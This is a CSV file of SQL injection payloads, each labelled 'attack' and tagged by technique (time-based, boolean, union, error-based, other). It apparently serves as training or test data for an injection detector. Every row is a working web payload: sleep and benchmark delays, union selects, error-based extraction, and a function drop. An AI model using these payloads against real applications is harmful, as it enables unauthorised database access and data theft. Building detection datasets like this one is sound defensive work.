label,payload,family
attack,1' rlike sleep  (  5  )  #,time
attack,"1'  )   as pkis where 3446  =  3446 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",boolean
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  ||'",time
attack,"-9924   )    )    as zgqa where 2867  =  2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",union
attack,end--,other
attack,"1   )    )    as fwru where 5262  =  5262 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",boolean
attack,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",boolean
attack,"1%'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  '%'  =  '",time
attack,"1""   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""nrhz"" like ""nrhz",boolean
attack,1'   )    )     )   and 6991  =  5579,boolean
attack,"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",boolean
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""pdqm"" like ""pdqm",boolean
attack,-5147 or   (  8459  =  8459  )  *4906,boolean
attack,"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'dreq'  =  'dreq",boolean
attack,"1,  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",other
attack,"1""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""xtyt""  =  ""xtyt",boolean
attack,"-8655  )   where 3910  =  3910 union all select 3910,3910#",union
attack,"1   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,1   )    )     )   and   (  6148  =  3343  )  *3343 and    (    (     (  3271  =  3271,boolean
attack,-7561  )   as ilrm where 8828  =  8828 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,boolean
attack,"1%'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",boolean
attack,1   )    )    and sleep  (  5  )   and    (    (   9084  =  9084,time
attack,"1  )   where 5261  =  5261 and elt  (  1210  =  1210,sleep  (  5   )    )   --",time
attack,"1'  )   where 1600  =  1600 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",union
attack,"1'||  (  select 'frrk' from dual where 3145  =  3145 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'",error
attack,1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'svhx'  =  'svhx,boolean
attack,"1""   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"-8734%""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,error
attack,1'||  (  select 'aevx' from dual where 9999  =  9999,other
attack,1'+  (  select snam where 1993  =  1993,other
attack,"1'   )    )    as crzr where 5373  =  5373 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'iari'  =  'iari",boolean
attack,"-4606""  )   as elek where 8261  =  8261 or 8571  =  8571--",boolean
attack,1%' order by 1--,other
attack,1   )    )    as pjkd where 1105  =  1105 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,error
attack,"1' union all select null,null,null,null,null,null,null#",union
attack,"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'xdfz'  =  'xdfz",boolean
attack,"-9451%""  )   union all select 9963,9963,9963--",union
attack,if  (  2823  =  3532  )   select 2823 else drop function kmqw--,other
attack,1' where 2690  =  2690,other
attack,"1%'   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1'+  (  select 'qmtx' where 6992  =  6992 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""nepk""  =  ""nepk",time
attack,"1""  )   where 5358  =  5358",other
attack,"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'bmzj' like 'bmzj",boolean
attack,"1'+  (  select 'qaar' where 7841  =  7841 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",boolean
attack,"-8034"" or 8571  =  8571--",boolean
attack,1'  )   where 5616  =  5616,other
attack,-1385'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'mjjd'  =  'mjjd,boolean
attack,"1""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""xjdh""  =  ""xjdh",boolean
attack,1  )   where 3979  =  3979 rlike sleep  (  5  )  --,time
attack,"1' where 1085  =  1085 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,1%' and 6454  =  8348 and '%'  =  ',boolean
attack,"1'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"-8054'   )    )    union all select 5232,5232,5232,5232,5232,5232,5232#",union
attack,"-6720'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'enfe' like 'enfe",error
attack,"1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",error
attack,"1""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"  (  select   (  case when   (  4232  =  4232  )   then   (  select benchmark  (  5000000,md5  (  0x6b637544   )    )     )   else 4232*  (  select 4232 from mysql.db  )   end   )    )   ",time
attack,1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'zwyx'  =  'zwyx,time
attack,-3136%'  )   or 3400  =  6002,boolean
attack,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'clcf'  =  'clcf,time
attack,"1  )   as zelk where 1944  =  1944 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'ltym'  =  'ltym",time
attack,"select * from generate_series  (  9058,9058,case when   (  9058  =  1183  )   then 1 else 0 end  )   limit 1--",other
attack,"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- ivku",error
attack,"1""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""rtzn""  =  ""rtzn",boolean
attack,"1""   )    )    as tljw where 8474  =  8474 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",boolean
attack,"1""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""pyfz"" like ""pyfz",error
attack,-9541 where 4291  =  4291 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,boolean
attack,1  )   as fxfe where 1148  =  1148 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,1'   )    )    as qpai where 2619  =  2619,other
attack,"1""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""eslj"" like ""eslj",error
attack,"1""   )    )    as zemm where 3324  =  3324 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"-6267""   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""rqws""  =  ""rqws",boolean
attack,"1%"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""%""  =  """,time
attack,"iif  (  6307  =  2459,1,1/0  )  ",other
attack,"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""hhwy""  =  ""hhwy",error
attack,1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'foju'  =  'foju,error
attack,"1"" and make_set  (  8403  =  8403,8899  )   and ""bbgg""  =  ""bbgg",boolean
attack,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""zzca""  =  ""zzca",time
attack,1'   )    )    as vnwn where 8774  =  8774 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,-6566'  )   as kggb where 9768  =  9768 order by 1--,other
attack,"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--",union
attack,"-6581'||  (  select 'hpjd' where 7608  =  7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#",union
attack,"1'  )   where 3579  =  3579   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
attack,"-3518  )   union all select 1877,1877,1877,1877#",union
attack,"1""  )   where 4971  =  4971 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,1   )    )    and 4637  =  1408 and    (    (   6509  =  6509,boolean
attack,"1'   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""xxug""  =  ""xxug",boolean
attack,"1"" order by 1#",other
attack,1%'   )    )     )   and 9198  =  9198--,boolean
attack,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",boolean
attack,"-5198   )    )     )   union all select 7089,7089,7089,7089,7089,7089,7089,7089#",union
attack,1'+  (  select basp where 6953  =  6953,other
attack,"1%"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""%""  =  """,boolean
attack,"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",boolean
attack,1'  )   where 2808  =  2808,other
attack,-3750'+  (  select alpu where 3911  =  3911 order by 1--,other
attack,"-2106"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""dvlq"" like ""dvlq",error
attack,1%'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"-7307'   )    )    union all select 5215,5215,5215,5215--",union
attack,"-2717"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",error
attack,1'   )    )    as clbc where 5649  =  5649,other
attack,1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'uwbt' like 'uwbt,boolean
attack,"1""  )   rlike sleep  (  5  )   and   (  ""rfsd""  =  ""rfsd",time
attack,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  '%'  =  ',time
